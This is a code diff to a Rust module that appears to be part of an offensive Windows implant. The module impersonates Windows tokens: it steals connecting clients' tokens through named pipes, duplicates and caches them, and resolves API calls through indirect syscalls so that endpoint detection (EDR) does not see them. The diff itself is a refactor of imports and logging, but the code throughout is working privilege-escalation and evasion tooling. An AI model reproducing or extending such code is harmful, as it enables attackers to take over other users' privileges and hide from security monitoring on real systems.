@@ -44,16 +44,16 @@
 
 #![cfg(all(windows, feature = "token-impersonation"))]
 
+use common::lock::MutexExt;
 use anyhow::{anyhow, Context, Result};
 use rand::Rng;
 use std::collections::HashMap;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Mutex, OnceLock};
-use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
-use winapi::um::winnt::{
-    SecurityImpersonation, TokenImpersonation, HANDLE, TOKEN_DUPLICATE, TOKEN_IMPERSONATE,
-    TOKEN_QUERY,
-};
+use crate::win_types::SECURITY_ATTRIBUTES;
+use windows_sys::Win32::Security::{SecurityImpersonation, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_QUERY};
+use crate::win_types::HANDLE;
+use windows_sys::Win32::Security::TokenImpersonation;
 /// Minimal token access for impersonation: TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY.
 ///
 /// P2-32: This is the minimum required set — no broad TOKEN_ALL_ACCESS mask.
@@ -78,20 +78,27 @@ unsafe fn get_last_error() -> u32 {
     if let Some(func) = fn_ptr {
         func()
     } else {
-        // Fallback: read TEB directly (x86_64 Windows)
+        // Fallback: read TEB directly (LastErrorValue at TEB+0x68).
         let teb: *mut u8;
-        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        #[cfg(target_arch = "x86_64")]
+        {
+            std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        }
+        #[cfg(target_arch = "aarch64")]
+        {
+            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
+        }
         std::ptr::read_volatile(teb.add(0x68) as *const u32)
     }
 }
-use winapi::um::handleapi::INVALID_HANDLE_VALUE;
+use crate::win_types::INVALID_HANDLE_VALUE;
 // All function imports removed — resolved dynamically via pe_resolve or indirect
 // syscalls to eliminate IAT entries visible to EDR. Type-only imports retained.
-use winapi::shared::minwindef::{DWORD, LPVOID};
-use winapi::shared::ntdef::NTSTATUS;
-use winapi::um::winbase::WAIT_OBJECT_0;
-use winapi::um::winbase::{PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE};
-use winapi::um::winnt::TOKEN_TYPE;
+use crate::win_types::{DWORD, LPVOID};
+use crate::win_types::NTSTATUS;
+use windows_sys::Win32::Foundation::WAIT_OBJECT_0;
+use windows_sys::Win32::System::Pipes::{PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE};
+use windows_sys::Win32::Security::TOKEN_TYPE;
 
 // ── Dynamic API resolution (IAT elimination) ────────────────────────────────
 //
@@ -228,7 +235,7 @@ unsafe fn nt_set_impersonation_token(token_handle: HANDLE) -> i32 {
     let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
-            log::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
+            tracing::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
             return STATUS_ACCESS_DENIED;
         }
     };
@@ -343,7 +350,7 @@ impl Drop for CachedToken {
         let h = self.handle;
         if h != 0 && h != usize::MAX {
             let _ = crate::syscall!("NtClose", h as u64);
-            log::trace!("token_impersonation: Closed cached token handle {h:#x} via Drop");
+            tracing::trace!("token_impersonation: Closed cached token handle {h:#x} via Drop");
         }
     }
 }
@@ -353,7 +360,7 @@ static TOKEN_CACHE: Mutex<Option<HashMap<TokenSource, CachedToken>>> = Mutex::ne
 
 /// Ensure the token cache is initialised and return a mutable guard.
 fn cache_mut() -> std::sync::MutexGuard<'static, Option<HashMap<TokenSource, CachedToken>>> {
-    let mut guard = TOKEN_CACHE.lock().unwrap();
+    let mut guard = TOKEN_CACHE.lock_recover();
     if guard.is_none() {
         *guard = Some(HashMap::new());
     }
@@ -371,7 +378,7 @@ unsafe fn nt_set_thread_impersonation_token(thread_handle: HANDLE, token_handle:
     let target = match crate::syscalls::get_syscall_id("NtSetInformationThread") {
         Ok(t) => t,
         Err(e) => {
-            log::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
+            tracing::error!("token_impersonation: failed to resolve NtSetInformationThread SSN: {e}");
             return STATUS_ACCESS_DENIED;
         }
     };
@@ -440,7 +447,7 @@ unsafe fn nt_duplicate_token(
     access: u32,
     token_type: TOKEN_TYPE,
 ) -> Result<HANDLE> {
-    use winapi::um::winnt::SECURITY_QUALITY_OF_SERVICE;
+    use windows_sys::Win32::Security::SECURITY_QUALITY_OF_SERVICE;
 
     let mut new_token: HANDLE = std::ptr::null_mut();
 
@@ -477,8 +484,8 @@ unsafe fn nt_duplicate_token(
 
 /// Query the user, domain, and SID from a token handle.
 fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
-    use winapi::um::winnt::{TokenUser, TOKEN_USER};
-
+    use windows_sys::Win32::Security::TokenUser;
+    use windows_sys::Win32::Security::TOKEN_USER;
     // First call to get the required buffer size.
     let mut needed: DWORD = 0;
     let get_token_info = resolve_fn(
@@ -531,7 +538,7 @@ fn query_token_user(token: HANDLE) -> Result<(String, String, String)> {
         if let Some(free_fn) = local_free_fn {
             unsafe { free_fn(sid_str as *mut _) };
         } else {
-            log::warn!("token_impersonation: LocalFree not resolved, leaking SID string buffer");
+            tracing::warn!("token_impersonation: LocalFree not resolved, leaking SID string buffer");
         }
         s
     } else {
@@ -600,7 +607,7 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     ) {
         Some(f) => f,
         None => {
-            log::error!("token_impersonation: ConnectNamedPipe not resolved");
+            tracing::error!("token_impersonation: ConnectNamedPipe not resolved");
             return 997;
         }
     };
@@ -609,10 +616,10 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     // zero for non-overlapped.  For non-overlapped, zero means success.
     // ERROR_PIPE_CONNECTED (535) means a client is already connected.
     let connected = wait_result != 0
-        || unsafe { get_last_error() } == winapi::shared::winerror::ERROR_PIPE_CONNECTED;
+        || unsafe { get_last_error() } == windows_sys::Win32::Foundation::ERROR_PIPE_CONNECTED;
 
     if !connected {
-        log::warn!("token_impersonation: ConnectNamedPipe failed in helper thread");
+        tracing::warn!("token_impersonation: ConnectNamedPipe failed in helper thread");
         return 1;
     }
 
@@ -624,14 +631,14 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     ) {
         Some(f) => f,
         None => {
-            log::error!("token_impersonation: ImpersonateNamedPipeClient not resolved");
+            tracing::error!("token_impersonation: ImpersonateNamedPipeClient not resolved");
             return 998;
         }
     };
     let ok = unsafe { impersonate_fn(ctx.pipe_handle) };
     if ok == 0 {
         let err = unsafe { get_last_error() };
-        log::warn!(
+        tracing::warn!(
             "token_impersonation: ImpersonateNamedPipeClient failed in helper thread: error {err}"
         );
         return 2;
@@ -666,7 +673,7 @@ pub fn init_from_config(config: &common::config::TokenImpersonationConfig) {
     });
 
     INITIALIZED.store(true, std::sync::atomic::Ordering::SeqCst);
-    log::info!(
+    tracing::info!(
         "token_impersonation: initialised (prefer_set_thread_token={})",
         config.prefer_set_thread_token
     );
@@ -725,7 +732,7 @@ pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
         .get()
         .ok_or_else(|| anyhow!("token_impersonation not initialised"))?;
 
-    log::info!(
+    tracing::info!(
         "token_impersonation: creating pipe '{full_path}' (strategy={})",
         if config.prefer_set_thread_token {
             "SetThreadToken"
@@ -884,28 +891,33 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
         ));
     }
 
-    // Cache the token.
-    let config = CONFIG.get().unwrap();
-    if config.cache_tokens {
-        let source = TokenSource::Pipe(pipe_path.to_string());
-        let cached = CachedToken {
-            handle: dup_token as usize,
-            user: user.clone(),
-            domain: domain.clone(),
-            sid: sid.clone(),
-            active: true,
-        };
-        let mut guard = cache_mut();
-        if let Some(ref mut cache) = *guard {
-            // Mark any previously active token as inactive.
-            for (_, entry) in cache.iter_mut() {
-                entry.active = false;
+    // Cache the token (if the module has been initialised).
+    if let Some(config) = CONFIG.get() {
+        if config.cache_tokens {
+            let source = TokenSource::Pipe(pipe_path.to_string());
+            let cached = CachedToken {
+                handle: dup_token as usize,
+                user: user.clone(),
+                domain: domain.clone(),
+                sid: sid.clone(),
+                active: true,
+            };
+            let mut guard = cache_mut();
+            if let Some(ref mut cache) = *guard {
+                // Mark any previously active token as inactive.
+                for (_, entry) in cache.iter_mut() {
+                    entry.active = false;
+                }
+                cache.insert(source, cached);
             }
-            cache.insert(source, cached);
         }
+    } else {
+        tracing::debug!(
+            "token_impersonation: CONFIG not initialised — skipping token cache for pipe {pipe_path}"
+        );
     }
 
-    log::info!(
+    tracing::info!(
         "token_impersonation: successfully impersonated {domain}\\{user} (SID={sid}) via SetThreadToken"
     );
 
@@ -1018,27 +1030,32 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
         ));
     }
 
-    // Cache the token.
-    let config = CONFIG.get().unwrap();
-    if config.cache_tokens {
-        let source = TokenSource::Pipe(pipe_path.to_string());
-        let cached = CachedToken {
-            handle: dup_token as usize,
-            user: user.clone(),
-            domain: domain.clone(),
-            sid: sid.clone(),
-            active: true,
-        };
-        let mut guard = cache_mut();
-        if let Some(ref mut cache) = *guard {
-            for (_, entry) in cache.iter_mut() {
-                entry.active = false;
+    // Cache the token (if the module has been initialised).
+    if let Some(config) = CONFIG.get() {
+        if config.cache_tokens {
+            let source = TokenSource::Pipe(pipe_path.to_string());
+            let cached = CachedToken {
+                handle: dup_token as usize,
+                user: user.clone(),
+                domain: domain.clone(),
+                sid: sid.clone(),
+                active: true,
+            };
+            let mut guard = cache_mut();
+            if let Some(ref mut cache) = *guard {
+                for (_, entry) in cache.iter_mut() {
+                    entry.active = false;
+                }
+                cache.insert(source, cached);
             }
-            cache.insert(source, cached);
         }
+    } else {
+        tracing::debug!(
+            "token_impersonation: CONFIG not initialised — skipping token cache for pipe {pipe_path}"
+        );
     }
 
-    log::info!(
+    tracing::info!(
         "token_impersonation: successfully impersonated {domain}\\{user} (SID={sid}) via NtSetInformationThread"
     );
 
@@ -1085,13 +1102,13 @@ pub fn revert_token() -> Result<String> {
         // Fall back to dynamically-resolved RevertToSelf if the syscall fails.
         if let Some(revert) = resolve_fn(&REVERT_TO_SELF, b"advapi32.dll\0", b"RevertToSelf\0") {
             unsafe { revert() };
-            log::warn!("token_impersonation: NtSetInformationThread(revert) failed (0x{status:08X}), used RevertToSelf fallback");
+            tracing::warn!("token_impersonation: NtSetInformationThread(revert) failed (0x{status:08X}), used RevertToSelf fallback");
         } else {
-            log::error!("token_impersonation: NtSetInformationThread(revert) failed (0x{status:08X}), RevertToSelf fallback also failed to resolve");
+            tracing::error!("token_impersonation: NtSetInformationThread(revert) failed (0x{status:08X}), RevertToSelf fallback also failed to resolve");
         }
     }
 
-    log::info!("token_impersonation: reverted to original process token");
+    tracing::info!("token_impersonation: reverted to original process token");
     Ok("Reverted to original process token".to_string())
 }
 
@@ -1118,8 +1135,8 @@ pub fn auto_revert() {
     }
 
     match revert_token() {
-        Ok(_) => log::debug!("token_impersonation: auto-reverted after task"),
-        Err(e) => log::warn!("token_impersonation: auto-revert failed: {e:#}"),
+        Ok(_) => tracing::debug!("token_impersonation: auto-reverted after task"),
+        Err(e) => tracing::warn!("token_impersonation: auto-revert failed: {e:#}"),
     }
 }
 
@@ -1218,7 +1235,7 @@ pub fn import_token(token_handle: HANDLE, source: TokenSource) -> Result<String>
         cache.insert(source, cached);
     }
 
-    log::info!("token_impersonation: imported token for {domain}\\{user} from {source_desc}");
+    tracing::info!("token_impersonation: imported token for {domain}\\{user} from {source_desc}");
 
     Ok(format!(
         "Imported token for {domain}\\{user} from {source_desc}"
@@ -1260,7 +1277,7 @@ pub fn apply_cached_token(source: Option<&TokenSource>) -> Result<()> {
         ));
     }
 
-    log::debug!("token_impersonation: applied cached token for {domain}\\{user}");
+    tracing::debug!("token_impersonation: applied cached token for {domain}\\{user}");
     Ok(())
 }
 
@@ -1278,10 +1295,10 @@ pub fn shutdown() {
     let _null_token: u64 = 0;
     let revert_status = unsafe { nt_set_impersonation_token(std::ptr::null_mut()) };
     if nt_error(revert_status) {
-        log::warn!("token_impersonation: shutdown revert failed: 0x{revert_status:08X}");
+        tracing::warn!("token_impersonation: shutdown revert failed: 0x{revert_status:08X}");
     }
 
-    log::info!("token_impersonation: shutdown complete, all tokens released");
+    tracing::info!("token_impersonation: shutdown complete, all tokens released");
 }
 
 // ── Tests ─────────────────────────────────────────────────────────────────
